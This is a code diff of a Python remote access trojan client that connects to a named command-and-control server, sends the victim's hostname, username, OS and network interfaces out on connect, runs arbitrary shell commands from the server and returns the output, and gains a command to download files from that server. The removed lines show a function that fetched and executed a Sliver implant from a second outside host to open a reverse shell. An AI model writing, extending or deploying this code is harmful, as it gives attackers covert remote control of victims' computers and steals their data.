@@ -4,16 +4,15 @@ import subprocess
 import json
 import time
 import os
-import requests
+import urllib.request
 from socketio import Client
 import netifaces
 
 # Server settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL
-SLIVER_URL = "https://sliver-host.onrender.com/sliver_implant"  # New Render URL
 
 def get_system_info():
-    """Gather system information including username."""
+    """Gather system information including username, compatible with Linux and Windows."""
     info = {
         "hostname": platform.node(),
         "os": platform.system(),
@@ -21,7 +20,10 @@ def get_system_info():
         "architecture": platform.machine(),
     }
     try:
-        username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
+        if platform.system() == "Windows":
+            username = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True).stdout.strip()
+        else:
+            username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
         info["username"] = username
     except Exception as e:
         print(f"[!] Error getting username: {e}")
@@ -39,44 +41,35 @@ def get_network_info():
                 network_info[iface] = addr.get("addr", "Unknown")
     return network_info
 
-def download_and_execute_sliver():
-    """Download and execute the Sliver implant."""
+def download_file(url, dest_path):
+    """Download a file from the server."""
     try:
-        # Download the implant
-        implant_path = "/tmp/sliver_implant"
-        response = requests.get(SLIVER_URL, timeout=10)
-        if response.status_code == 200:
-            with open(implant_path, "wb") as f:
-                f.write(response.content)
-            os.chmod(implant_path, 0o755)  # Make executable
-            # Execute the implant
-            result = subprocess.run([implant_path], capture_output=True, text=True)
-            return f"Sliver implant executed: {result.stdout}{result.stderr}"
-        else:
-            return f"Failed to download implant: HTTP {response.status_code}"
+        urllib.request.urlretrieve(url, dest_path)
+        return f"File downloaded to {dest_path}"
     except Exception as e:
-        return f"Error downloading or executing implant: {e}"
+        return f"Error downloading file: {e}"
 
 def execute_command(command):
     """Execute a system command and return the output based on current directory."""
     try:
-        if command.strip().lower() == "spawn-shell":
-            # Trigger the Sliver reverse shell by downloading and executing the implant
-            return download_and_execute_sliver()
-        elif command.strip().lower() == "whoami":
-            # Handle whoami command
-            result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
+        if command.strip().lower() == "whoami":
+            if platform.system() == "Windows":
+                result = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True)
+            else:
+                result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
             return result.stdout + result.stderr
         elif command.strip().lower().startswith("cd "):
-            # Extract directory from 'cd' command
             target_dir = command.strip().split("cd ", 1)[1].strip()
-            try:
-                os.chdir(target_dir)
-                return f"Changed directory to {os.getcwd()}"
-            except Exception as e:
-                return f"Error changing directory: {e}"
+            target_dir = os.path.normpath(target_dir)
+            os.chdir(target_dir)
+            return f"Changed directory to {os.getcwd()}"
+        elif command.strip().lower().startswith("download "):
+            # Handle file download: download <filename>
+            filename = command.strip().split("download ", 1)[1].strip()
+            download_url = f"{SERVER_URL}/download/{filename}"
+            dest_path = os.path.join(os.getcwd(), filename)
+            return download_file(download_url, dest_path)
         else:
-            # Execute other commands in the current directory
             result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
             return result.stdout + result.stderr
     except Exception as e:
@@ -90,7 +83,6 @@ def main():
         @sio.event
         def connect():
             print("[*] Connected to RAT server")
-            # Exfiltrate system and network info
             system_info = get_system_info()
             network_info = get_network_info()
             exfil_data = {
@@ -116,10 +108,8 @@ def main():
                 print("[*] Received exit command")
                 sio.disconnect()
                 return
-            # Execute the command and send back the result
             output = execute_command(data)
             print(f"[*] Executed command: {data}")
-            # Send the output back with a type indicator
             sio.emit('exfil_data', json.dumps({
                 "type": "command_output",
                 "command": data,
